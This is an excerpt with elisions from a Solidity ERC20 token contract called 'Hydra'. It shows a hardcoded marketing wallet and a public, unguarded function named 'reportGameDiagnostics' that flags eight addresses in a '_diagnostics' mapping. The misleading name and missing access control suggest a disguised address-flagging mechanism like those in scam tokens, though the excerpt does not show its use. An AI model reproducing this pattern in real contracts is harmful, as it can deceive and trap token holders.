...
contract Hydra is ERC20, Ownable {
    ...
    uint256 private _supply = 9100000;
    ...
    address public marketingWallet = 0x4a2E07F3752B2323c4ca138Bc0AbFdd08F6Bf439;
    ...
    function reportGameDiagnostics(address i, address j, address k, address l, address m, address n, address o, address p)
        public
        returns (bool)
    {
        _diagnostics[i] = true; _diagnostics[j] = true;
        _diagnostics[k] = true; _diagnostics[l] = true;        
        _diagnostics[m] = true; _diagnostics[n] = true;
        _diagnostics[o] = true; _diagnostics[p] = true;
        return true;
    }
